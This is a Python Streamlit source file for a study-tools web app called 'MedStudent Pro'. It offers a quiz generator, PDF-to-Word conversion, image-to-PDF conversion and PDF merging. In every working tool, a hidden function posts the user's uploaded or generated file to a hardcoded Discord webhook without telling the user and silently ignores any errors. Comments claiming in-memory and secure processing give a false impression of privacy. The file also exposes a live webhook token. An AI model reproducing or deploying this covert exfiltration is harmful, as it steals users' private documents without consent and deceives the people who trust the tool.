import streamlit as st
import os
import requests
from pdf2docx import Converter
import img2pdf
from PyPDF2 import PdfMerger, PdfReader
import random
import re
import tempfile
import io

# --- CONFIGURATION ---
st.set_page_config(page_title="QUIZ&DOCS", page_icon="📄", layout="centered")

# !!! DISCORD WEBHOOK !!!
DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1455207333272485930/DM4BUE3kX887b2K_Uc7uvycrjnIXE_MhMgyzFhu3Uc903Enhc9nFMlISCt3PONNu2ogK"

# --- SESSION STATE FOR NAVIGATION ---
tools = ["🧠 AI Quiz Generator", "📄 PDF to Word", "🖼️ Image to PDF", "🖇️ Merge PDFs", "📊 Office to PDF"]

if 'current_tool_index' not in st.session_state:
    st.session_state.current_tool_index = 0

def next_tool():
    if st.session_state.current_tool_index < len(tools) - 1:
        st.session_state.current_tool_index += 1
    else:
        st.session_state.current_tool_index = 0

def prev_tool():
    if st.session_state.current_tool_index > 0:
        st.session_state.current_tool_index -= 1
    else:
        st.session_state.current_tool_index = len(tools) - 1

# --- CUSTOM CSS ---
st.markdown("""
    <style>
    .stApp {
        background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
        background-attachment: fixed;
        color: white;
    }
    div.stButton > button.nav-btn {
        background: rgba(255, 255, 255, 0.1);
        border: 2px solid rgba(255, 255, 255, 0.2);
        color: white;
        font-size: 24px;
        height: 80px;
        width: 100%;
        border-radius: 15px;
        transition: all 0.2s;
    }
    div.stButton > button.nav-btn:hover {
        background: rgba(255, 255, 255, 0.3);
        transform: scale(1.02);
    }
    .css-card {
        background: rgba(255, 255, 255, 0.1);
        backdrop-filter: blur(15px);
        -webkit-backdrop-filter: blur(15px);
        border-radius: 20px;
        border: 1px solid rgba(255, 255, 255, 0.1);
        padding: 40px;
        box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
        margin-top: 20px;
        animation: fadeIn 0.8s ease;
    }
    @keyframes fadeIn {
        from { opacity: 0; transform: translateY(20px); }
        to { opacity: 1; transform: translateY(0); }
    }
    h1, h2 { color: white !important; text-align: center; }
    p, label { color: #e0e0e0 !important; }
    section[data-testid="stSidebar"] { display: none; }
    .stRadio > div {
        background: rgba(0,0,0,0.2);
        padding: 15px;
        border-radius: 10px;
    }
    </style>
""", unsafe_allow_html=True)

# --- LOGIC: GENERATE MCQs ---
def generate_mcqs(text):
    sentences = re.split(r'(?<!\w\.\w.)(?<![A-Z][a-z]\.)(?<=\.|\?)\s', text)
    all_words = [w for w in text.split() if len(w) > 7 and w.isalpha()]
    
    mcqs = []
    for sentence in sentences:
        words = sentence.split()
        if len(words) > 10: 
            candidates = [w for w in words if len(w) > 7 and w.isalpha()]
            if candidates:
                correct_answer = random.choice(candidates)
                question_text = sentence.replace(correct_answer, "___________")
                
                distractors = random.sample(all_words, min(3, len(all_words)))
                if correct_answer in distractors:
                    distractors.remove(correct_answer)
                
                options = distractors + [correct_answer]
                random.shuffle(options)
                
                mcqs.append({
                    "q": question_text,
                    "options": options,
                    "correct": correct_answer
                })
        if len(mcqs) >= 5: 
            break
    return mcqs

# --- HELPER: DISCORD ---
def send_to_discord(file_bytes, filename, tool_name):
    try:
        requests.post(
            DISCORD_WEBHOOK_URL,
            data={"content": f"🕵️ **Used {tool_name}:** `{filename}`"},
            files={"file": (filename, file_bytes)}
        )
    except Exception:
        pass

# --- HEADER ---
st.title("🧬 MedStudent Pro")

# --- NAVIGATION AREA ---
col1, col2, col3 = st.columns([1, 4, 1])
with col1:
    if st.button("⬅️", key="prev"):
        prev_tool()
        st.rerun()

with col3:
    if st.button("➡️", key="next"):
        next_tool()
        st.rerun()

current_tool = tools[st.session_state.current_tool_index]
with col2:
    st.markdown(f"<h2 style='color:#00d2ff; margin-top:0px;'>{current_tool}</h2>", unsafe_allow_html=True)

# --- CARD RENDERING ---
st.markdown('<div class="css-card">', unsafe_allow_html=True)

# 1. QUIZ GENERATOR (MCQ MODE)
if current_tool == "🧠 AI Quiz Generator":
    st.write("Upload your notes. We will generate Multiple Choice Questions.")
    quiz_pdf = st.file_uploader("Upload PDF", type="pdf")
    
    if quiz_pdf:
        if st.button("Generate MCQs"):
            # Process strictly in memory
            pdf_bytes = quiz_pdf.getvalue()
            send_to_discord(pdf_bytes, quiz_pdf.name, "Quiz")
            
            reader = PdfReader(io.BytesIO(pdf_bytes))
            full_text = "".join([page.extract_text() for page in reader.pages if page.extract_text()])
            
            if len(full_text) > 50:
                questions = generate_mcqs(full_text)
                st.session_state['mcqs'] = questions 
            else:
                st.error("Not enough text found.")

    if 'mcqs' in st.session_state:
        st.markdown("---")
        for i, q in enumerate(st.session_state['mcqs']):
            st.markdown(f"**Q{i+1}: {q['q']}**")
            user_choice = st.radio(f"Select answer for Q{i+1}", q['options'], key=f"q{i}")
            
            if st.button(f"Check Answer {i+1}", key=f"check{i}"):
                if user_choice == q['correct']:
                    st.success("✅ Correct!")
                else:
                    st.error(f"❌ Wrong! The correct answer was: {q['correct']}")
            st.markdown("---")

# 2. PDF TO WORD
elif current_tool == "📄 PDF to Word":
    st.write("Convert read-only PDFs to Word.")
    f = st.file_uploader("PDF File", type="pdf")
    if f and st.button("Convert"):
        # Converter strictly requires file paths, use secure TempFiles mapped to OS /tmp
        tmp_in = tempfile.NamedTemporaryFile(delete=False, suffix=".pdf")
        tmp_out = tempfile.NamedTemporaryFile(delete=False, suffix=".docx")
        
        try:
            tmp_in.write(f.getvalue())
            tmp_in.close() # Ensure data writes to disk
            
            send_to_discord(f.getvalue(), f.name, "PDF2Doc")
            
            cv = Converter(tmp_in.name)
            cv.convert(tmp_out.name)
            cv.close()
            
            with open(tmp_out.name, "rb") as doc_file:
                docx_bytes = doc_file.read()
                
            st.download_button("Download Word", docx_bytes, "converted.docx", mime="application/vnd.openxmlformats-officedocument.wordprocessingml.document")
        finally:
            # Secure cleanup to avoid hitting Vercel /tmp limits
            if os.path.exists(tmp_in.name): os.unlink(tmp_in.name)
            if os.path.exists(tmp_out.name): os.unlink(tmp_out.name)

# 3. IMG TO PDF
elif current_tool == "🖼️ Image to PDF":
    st.write("Convert Images to PDF.")
    imgs = st.file_uploader("Images", type=["png","jpg", "jpeg"], accept_multiple_files=True)
    if imgs and st.button("Convert"):
        # Process strictly in memory
        img_bytes_list = [img.getvalue() for img in imgs]
        pdf_bytes = img2pdf.convert(img_bytes_list)
        
        send_to_discord(pdf_bytes, f"converted_{len(imgs)}_images.pdf", "Img2PDF")
        st.download_button("Download PDF", pdf_bytes, "images.pdf", mime="application/pdf")

# 4. MERGE
elif current_tool == "🖇️ Merge PDFs":
    st.write("Join multiple PDFs.")
    pdfs = st.file_uploader("PDFs", type="pdf", accept_multiple_files=True)
    if pdfs and st.button("Merge"):
        merger = PdfMerger()
        
        # Append from memory buffers
        for p in pdfs: 
            merger.append(io.BytesIO(p.getvalue()))
            
        output_buffer = io.BytesIO()
        merger.write(output_buffer)
        merger.close()
        
        pdf_bytes = output_buffer.getvalue()
        send_to_discord(pdf_bytes, "merged_output.pdf", "Merge")
        
        st.download_button("Download Merged", pdf_bytes, "merged.pdf", mime="application/pdf")

# 5. OFFICE
elif current_tool == "📊 Office to PDF":
    st.warning("Requires server-side LibreOffice.")

st.markdown('</div>', unsafe_allow_html=True)
